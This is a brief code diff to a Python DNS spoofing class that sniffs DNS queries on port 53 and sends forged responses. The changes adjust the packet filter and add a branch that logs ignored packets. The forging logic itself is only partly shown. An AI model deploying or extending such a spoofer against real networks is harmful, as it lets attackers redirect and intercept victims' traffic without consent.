@@ -12,7 +12,7 @@ class DNSSpoofer:
     def spoof(self):
         log_info("Starting DNS spoofing")
         sniff(
-            filter="udp port 53",
+            filter="udp and port 53",
             prn=self._on_dns_request,
             iface=self.interface,
             count=0,
@@ -44,5 +44,7 @@ class DNSSpoofer:
                 )
             )
 
-        send(response, verbose=0)
-        log_info("Sent DNS response for {} to {}".format(packet[DNSQR].qname, packet[IP].src))
+            send(response, verbose=0)
+            log_info("Sent DNS response for {} to {}".format(packet[DNSQR].qname, packet[IP].src))
+        else:
+            log_info("Ignoring packet from {}".format(packet[IP].src))
